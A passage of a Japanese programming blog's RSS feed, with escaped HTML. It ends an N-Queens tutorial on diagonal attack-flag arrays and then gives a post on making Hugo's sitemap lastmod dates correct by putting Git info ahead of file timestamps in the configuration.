&lt;/figure>&lt;/p>
&lt;p>row-i+(size-1) で計算してみましょう&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,0] 0-0+(4-1)=3
2行目2列目 [1,1] 1-1+(4-1)=3
3行目3列目 [2,2] 2-2+(4-1)=3
4行目4列目 [3,3] 3-3+(4-1)=3
&lt;/code>&lt;/pre>&lt;p>FB[4] にフラグをたてれば左対角線の利き筋をチェックすることができます。&lt;/p>
&lt;p>2行目3列目にクイーンを置いた場合はどうなるでしょう&lt;/p>
&lt;p>左斜め対角線の利き筋は以下の通りになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目2列目 [0,1]
2行目3列目 [1,2]
3行目4列目 [2,3]
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 99;
flex-basis: 238px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/l5.png" data-size="330x332">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/l5.png"
width="330"
height="332"
loading="lazy"
alt="図">
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>row-i+(size-1) で計算してみましょう&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目2列目 [0,1] 0-1+(4-1)=2
2行目3列目 [1,2] 1-2+(4-1)=2
3行目4列目 [2,3] 2-3+(4-1)=2
&lt;/code>&lt;/pre>&lt;p>FB[3] にフラグをたてれば左対角線の利き筋をチェックすることができます。&lt;/p>
&lt;p>FC 右斜め対角線の利き筋について見てみましょう&lt;/p>
&lt;p>右斜め対角線のフラグの位置の計算法則は&lt;br>
行数+クイーンを置いた列数&lt;br>
row+i&lt;br>
で1次元配列で表現できます。&lt;/p>
&lt;p>図で見てみましょう。&lt;br>
1行目の4列目にクイーンを置いた場合&lt;br>
右斜め対角線の利き筋は以下の通りになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,3]
2行目2列目 [1,2]
3行目3列目 [2,1]
4行目4列目 [3,0]
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 102;
flex-basis: 245px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/r1.png" data-size="330x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/r1.png"
width="330"
height="322"
loading="lazy"
alt="図">
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>row+iで計算してみましょう&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,3] 0+3=3
2行目2列目 [1,2] 1+2=3
3行目3列目 [2,1] 2+1=3
4行目4列目 [3,0] 3+0=3
&lt;/code>&lt;/pre>&lt;p>FC[4] にフラグをたてれば右対角線の利き筋をチェックすることができます。&lt;/p>
&lt;p>2行目の2列目にクイーンを置いた場合&lt;br>
右斜め対角線の利き筋は以下の通りになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,2]
2行目2列目 [1,1]
3行目3列目 [2,0]
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 99;
flex-basis: 238px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/r5.png" data-size="334x336">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/r5.png"
width="334"
height="336"
loading="lazy"
alt="図">
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>row+iで計算してみましょう&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,2] 0+2=2
2行目2列目 [1,1] 1+1=2
3行目3列目 [2,0] 2+0=2
&lt;/code>&lt;/pre>&lt;p>FC[3] にフラグをたてれば右対角線の利き筋をチェックすることができます。&lt;/p>
&lt;p>長くなりましたので今回はグローバル変数の説明だけで終わります。&lt;br>
次回は、新しく追加されたmainメソッドからプログラムの概要を説明したいと思います。&lt;/p></description></item><item><title>SEO対策のためにGitとHugoで連携したXMLの更新日（lastmod）を正しく表示する方法</title><link>https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/</link><pubDate>Mon, 07 Feb 2022 11:28:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/catch.jpg" alt="Featured image of post SEO対策のためにGitとHugoで連携したXMLの更新日（lastmod）を正しく表示する方法" />&lt;p>Hugoを使って記事を作成しているのですが、サイトマップをみてみるとlastmodの値がすべて同じになってました。その原因と解決策を今回は探っていこうと思います。&lt;/p>
&lt;p>Hugoの導入や記事の投稿についての情報は&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2021-12-21-01/" target="_blank" rel="noopener"
>Hugoで記事の投稿の仕方&lt;/a>や&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2021-12-22-hugo-01-ywat/" target="_blank" rel="noopener"
>デザイナーでもできる初めてのHUGO #01&lt;/a>を確認してください。&lt;/p>
&lt;h2 id="gitから更新情報を取得するようにしている">Gitから更新情報を取得するようにしている&lt;/h2>
&lt;p>Hugoは非常に強力な機能をたくさん持っています。その一つがGitにある情報にアクセスできるという点です。&lt;br>
この機能を使えば、Gitに登録した人を投稿者としたり、push した日付を更新日とすることができます。&lt;br>
つまり、自分で投稿者や更新日を記述する必要がないということになります。&lt;/p>
&lt;p>このブログでもHugoとGitの連携を行っております。その連携自体は簡単です。&lt;br>
設定ファイルに&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">enableGitInfo&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>と記述するだけで、Gitの情報にアクセスできます。&lt;/p>
&lt;h2 id="frontmatterの記述">frontmatterの記述&lt;/h2>
&lt;p>Hugoには日付を制御できる設定があります。Hugoがコンテンツ・ページに日付を割り当てる方法を設定することができます。これは、config に frontmatter セクションを追加することで行うことが可能です。&lt;br>
私の環境では下記のようになっておりました。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">frontmatter&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">lastmod&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">fileModTime&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">git&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">lastmod&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>:fileModTime&lt;/code>はコンテンツファイルの最終更新タイムスタンプから日付を取得します。&lt;br>
&lt;code>:git&lt;/code>ではコンテンツファイルの最終リビジョンのGit作成日となります。&lt;br>
この設定を使うには、&lt;code>--enableGitInfo&lt;/code> が設定されているか、サイト構成で &lt;code>enableGitInfo = true &lt;/code>が設定されている必要があります。つまり、先程の設定ファイルに記述した設定となります。&lt;br>
そして、&lt;code>lastmod&lt;/code>です。&lt;/p>
&lt;p>この設定は上から順に評価されていきます。&lt;/p>
&lt;p>詳細は&lt;a class="link" href="https://gohugo.io/getting-started/configuration/#configure-front-matter" target="_blank" rel="noopener"
>Hugoのfrontmatter&lt;/a>を確認してください。&lt;/p>
&lt;h2 id="git-actioinsで設定したxmlの更新日がすべて同じになった">Git Actioinsで設定したXMLの更新日がすべて同じになった&lt;/h2>
&lt;p>今回は&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-26-01-wyoshi/" target="_blank" rel="noopener"
>XMLの作成&lt;/a>の際にGitのデータを使用するようにしていました。&lt;br>
ローカルで確認したところ、&lt;code>hugo server&lt;/code>での動作も、&lt;code>hugo&lt;/code>にて書き出したファイルも更新日である&lt;code>lastmod&lt;/code>が正常に表示されていたので問題ないと判断して、Gitにアップしました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 147;
flex-basis: 354px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/img01.png" data-size="980x663">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/img01.png"
width="980"
height="663"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>しかし、Gitではローカルと動作が異なっており、すべて同じ日付となってしまいました。&lt;br>
一体なぜでしょうか？&lt;/p>
&lt;h3 id="ランキングや最新記事の反映で日付が更新された可能性">ランキングや最新記事の反映で日付が更新された可能性&lt;/h3>
&lt;p>このサイトでは最新記事やランキングを掲載しております。それらは時間や投稿のタイミングで変化します。そういた変化を検知してしまって日付が変わってしまった可能性が考えられます。&lt;br>
しかし、そうだとしたら、ローカルでも同様の問題になるかと思うので、この可能性は低そうです。&lt;/p>
&lt;h3 id="github-pagesで別ブランチで管理している">GitHub Pagesで別ブランチで管理している&lt;/h3>
&lt;p>このサイトはGitHub Pagesを使って別ブランチで管理しています。つまり、公開ディレクトリにあたる public 部分は前の考察のランキングや最新記事によって全てのページが変更されています。&lt;br>
そして、別ブランチにアップする。つまり、すべてが書き換わるといったことが起こったのではないでしょうか。&lt;/p>
&lt;h2 id="解決策">解決策&lt;/h2>
&lt;p>解決策はすごくと簡単です。&lt;br>
Git と連携して lastmod の日付を自動で設定するために、&lt;code>enableGitInfo: true&lt;/code> としていました。そして、この設定と同時に、下記のような設定もHugoの設定ファイル（yaml形式）に記述していました。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">frontmatter&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">lastmod&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">fileModTime&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">git&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">lastmod&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ここの frontmatter の記述をすべてコメントアウトにします。&lt;br>
それか、優先度のファイルのタイムスタンプから&lt;code>:git&lt;/code>に変更します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">frontmatter&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">lastmod&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">git&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">fileModTime&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">lastmod&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>これでlastmodが正しく表示されるようになりました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 169;
flex-basis: 406px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/img02.png" data-size="980x578">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/img02.png"
width="980"
height="578"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>lastmod はSEOとしてあまり必要とされていないといった声も聞かれますが、正しく表示しておくことでサイトとしての信頼性は格段に上がると思います。&lt;br>
HugoとGitの連携を行った際に、更新日など正しく反映されない箇所があった場合は設定などを見直してみましょう。&lt;br>
簡単なことで問題が解決するかもしれません。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/GitHub%e5%ae%9f%e8%b7%b5%e5%85%a5%e9%96%80-Pull-Request%e3%81%ab%e3%82%88%e3%82%8b%e9%96%8b%e7%99%ba%e3%81%ae%e5%a4%89%e9%9d%a9-PRESS-plus/dp/477416366X/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51PjpAUHZBL.jpg">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> GitHub実践入門 ~Pull Requestによる開発の変革 (WEB&amp;#43;DB PRESS plus) &lt;/h2>
&lt;p> GitHubの実践的な使い方を、実際に手を動かす形で解説する書籍です。初学者の方にもわかりやすいよう、基本的なGitやGitHubの使い方から、「ソーシャルコーディング」の目玉機能であるPull Requestの送り方・受け方まで解説します。また、外部ツールとの連携、GitHub FlowやGit Flowなど、GitHubを中心とした開発手法についてもしっかり解説しているので、中・上級者の方にも参考になるはずです。 目次 第1章:GitHubの世界へようこそ 第2章:Gitの導入 第3章:GitHubを利用するための準備 第4章:Gitを操作しながら学ぶ 第5章:GitHubの機能を徹底解説 第6章:はじめてのPull Request 第7章:Pull Requestが送られてきたら 第8章:GitHubと連携するツールとサービス 第9章:GitHubを利用した開発フロー 第10章:会社でGitHubを使おう Appendix A:GitHubをサポートするGUIクライアント Appendix B:Gistで手軽にコードを共有 続きを読む 。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e6%94%b9%e8%a8%822%e7%89%88-%e3%82%8f%e3%81%8b%e3%81%b0%e3%81%a1%e3%82%83%e3%82%93%e3%81%a8%e5%ad%a6%e3%81%b6-Git%e4%bd%bf%e3%81%84%e6%96%b9%e5%85%a5%e9%96%80%e3%80%88GitHub%e3%80%81SourceTree%e3%80%81%e3%82%b3%e3%83%9e%e3%83%b3%e3%83%89%e6%93%8d%e4%bd%9c%e5%af%be%e5%bf%9c%e3%80%89-%e6%b9%8a%e5%b7%9d-%e3%81%82%e3%81%84/dp/4863543433/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51ITQMzMG2L.jpg">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 &lt;/h2>
&lt;p> マンガと実践で学ぶGitの入門書が最新情報に対応して改訂しました! Gitの概念はもちろん、GitHubについても丁寧に解説しています。これからGitを使い始める人にオススメの1冊です。 本書ではクリック操作でGitを使えるSourceTreeを中心に解説しているので、初心者でも安心です。 はじめにより抜粋 ■せっかく学ぶなら、やっぱり楽しい方がいい 「Gitって難しそう」 「勉強しようとは思っているけど、なかなか一歩が踏み出せない」 そんな方のために、楽しくGitを理解できる本を作りました。 ・個性的なキャラクターたちが登場するマンガ ・感覚的にわかる図解 ・丁寧な実践パート 上記3つの特長で、Gitを無理なく学べます。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item></channel></rss>